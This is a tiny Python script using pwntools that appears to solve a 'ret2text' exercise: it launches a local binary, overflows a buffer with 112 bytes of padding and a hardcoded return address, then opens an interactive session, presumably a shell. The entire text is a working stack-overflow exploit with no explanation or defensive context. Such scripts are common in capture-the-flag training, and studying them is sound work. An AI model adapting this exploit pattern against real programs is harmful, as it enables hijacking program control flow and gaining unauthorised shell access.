from pwn import *

system_addr = 0x0804863A
offset = 112
sh = process("./ret2text")
sh.sendline(b"A" * offset + p32(system_addr))
sh.interactive()
